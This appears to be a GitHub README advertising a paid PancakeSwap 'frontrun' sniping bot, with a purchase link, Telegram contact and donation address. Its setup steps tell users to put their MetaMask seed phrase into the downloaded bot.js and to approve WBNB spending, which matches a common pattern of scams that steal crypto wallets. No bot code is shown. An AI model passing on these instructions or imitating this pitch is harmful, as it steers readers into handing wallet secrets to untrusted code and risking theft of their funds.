- 👋 Hi, I’m @pcs-frontrun
- 👀 I’m interested in DEFI
- 📫 How to reach me ... tg; @frontrun_pcs
PURCHASE LINK: https://enzypt.io/Q0PXNpJjSsxWCPpHs0VgShFoA64ZWlgW/TG99udi6FnERhflDbWlC-lfFIgk5ekXpH50XmIzIMY8

A simple pancakeswap frontrun bot that purchases the specified token when liquidity is added.

IMPORTANT NOTES BEFORE RUNNING THE BOT
The bot uses a wallet address and see phrase - this needs to be the FIRST ACCOUNT (Account0 by default) that was created by default when you installed metamask on your pc / macbook.

if this is NOT configured correctly you will get an error that says "(node:45320) UnhandledPromiseRejectionWarning: Error: insufficient funds for intrinsic transaction cost"
Make sure you have the following assets in your MetaMask wallet FOR THE ACCOUNT ADDRESS WITH WHICH YOU ARE USING THE BOT

BNB (this is needed for gas)
WBNB (this is used to purchase the desired token)
IF you want to TEST the bot using WBNB / BUSD, then ADD the BUSD custom token to your MetaMask (0xe9e7cea3dedca5984780bafc599bd69add087d56)
Run the bot using the to_Purchase value of the BUSD token contract. This works because liquidity is frequently added to this pool.
APPROVE WBNB in your MetaMask

you need to approve your wallet to spend WBNB in order for the bot to be able to make purchases
to do this, go to pancakeswap, and in FROM put WBNB, and in the TO put elongate (0x2A9718defF471f3Bb91FA0ECEAB14154F150a385), and click 'Approve'.
confirm the transaction in MetaMask
Now WBNB should be approved, and the purchase transactions the bot will make on your wallets behalf using WBNB will not fail.
BOT SETUP & CONFIGURATION INSTRUCTIONS
Download & Install Node.js - https://nodejs.org/en/ - 14.16.1 LTS is fine

Extract the bot zip / download contents to a folder, example C:\users\username\Downloads\pancakeswap-sniping-bot\

install node dependencies | do not update anything manually during this process, only type the commands, and press enter.

open command prompt
cd C:\users\username\Downloads\pancakeswap-sniping-bot\ ENTER
npm install ethers ENTER
npm install chalk ENTER
npm install express ENTER
open package.json file inside your directory,

"type": "module",
this should be on line 6, after the line "main": "bot.js",
entire package.json should be:
{
    "name": "trading-bot",
    "version": "1.0.0",
    "description": "",
    "main": "bot.js",
    "type": "module",
    "scripts": {
        "test": "echo \"Error: no test specified\" && exit 1"
    },
    "author": "",
    "license": "ISC",
    "dependencies": {
        "chalk": "^4.1.1",
        "ethers": "^5.1.4",
        "express": "^4.17.1"
    }
}
open bot.js and input:

the contract address of the token you want to purchase on line 9
you can use BUSD as an example, as the WBNB / BUSD liquidity pool gets additions every few minutes
your wallet address on line 12
the amount of WBNB of the token you want to purchase on line 13
the slippage required to purchase the token on pancakeswap on line 14
you will need to MAKE SURE the slippage is set correctly for each token you plan to purchase
the seed phrase of your wallet on line 22
save the changes to bot.js

Run the bot

open the command prompt (it should be in the same directory it was earlier when you issued node commands)
type 'node bot' and hit ENTER to run the bot
you should see the bot listening for liquidity addition to pancakeswap in your command prompt window
Donations
More donations are appreciated if you make a nice profit off the bot. :) ETH, ERC20, BSC BNB & BEP20 tokens: 0xd83c471D746e98A3b779A58bB0dCD84853ff6628
<!---
pcs-frontrun/pcs-frontrun is a ✨ special ✨ bot because its `MONEY MAKING BOT`.
